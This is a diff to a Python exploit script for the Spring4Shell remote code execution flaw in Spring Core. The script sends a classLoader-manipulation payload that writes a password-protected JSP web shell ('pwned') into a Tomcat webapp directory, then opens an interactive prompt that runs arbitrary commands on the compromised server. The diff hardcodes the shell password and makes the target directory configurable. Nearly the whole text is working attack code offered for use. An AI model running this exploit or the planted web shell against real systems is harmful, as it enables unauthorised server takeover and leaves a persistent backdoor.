@@ -5,30 +5,27 @@ from urllib.parse import urljoin
 
 urllib3.disable_warnings()
 
-def Exploit(url, shellpass):
+def Exploit(url, dir):
     headers = {"suffix":"%>//",
         "c1":"Runtime",
         "c2":"<%",
         "DNT":"1",
         "Content-Type":"application/x-www-form-urlencoded"
         }
-    data = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22{shellpass}%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=spring4shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+    data = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22pwned%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory={dir}&class.module.classLoader.resources.context.parent.pipeline.first.prefix=spring4shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
     try:
         shellurl = urljoin(url, 'spring4shell.jsp')
-        #check = requests.get(f"{shellurl}?pwd={shellpass}&cmd=echo+2c241574-1a14-4d84-9c58-75dc3ed08fd0",timeout=15,allow_redirects=False, verify=False)
-        # if "2c241574-1a14-4d84-9c58-75dc3ed08fd0" not in check.text:
-        #     print("##################################")
         requests.post(url,headers=headers,data=data,timeout=15,allow_redirects=False, verify=False)
-        shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)
+        shellgo = requests.get(f"{shellurl}?pwd=pwned&cmd=",timeout=15,allow_redirects=False, verify=False)
         if shellgo.status_code == 200:
-            print(f"Exploit succeded，Visit: {url}spring4shell.jsp?pwd={shellpass}&cmd=id")
+            print(f"Exploit succeded，Visit: {url}spring4shell.jsp?pwd=pwned&cmd=id")
             try:
                 while True:
                     cmd = input("cmd > ")
                     if cmd == "exit" or cmd == "quit":
                         sys.exit()
                     while True:
-                        r = requests.get(f"{shellurl}?pwd={shellpass}&cmd={cmd}",timeout=15,allow_redirects=False,verify=False)
+                        r = requests.get(f"{shellurl}?pwd=pwned&cmd={cmd}",timeout=15,allow_redirects=False,verify=False)
                         if r.text == '':
                             continue
                         else:
@@ -48,15 +45,11 @@ def Exploit(url, shellpass):
 
 def main():
     parser = argparse.ArgumentParser(description='Srping-Core Rce.')
-    parser.add_argument('--url',help='target url',required=True)
-    parser.add_argument('--shellpass',help='backdoor password',required=False)
+    parser.add_argument('--url',help='Target URL',required=True)
+    parser.add_argument('--dir', help='Directory of target app. Suggest using "webapps/[appname]"', required=False, default="webapps/ROOT")
     args = parser.parse_args()
-    if args.shellpass:
-        password = args.shellpass
-    else:
-        password = "pwned"
     if args.url:
-        Exploit(args.url, password)
+        Exploit(args.url, args.dir)
    
 if __name__ == '__main__':
     main()
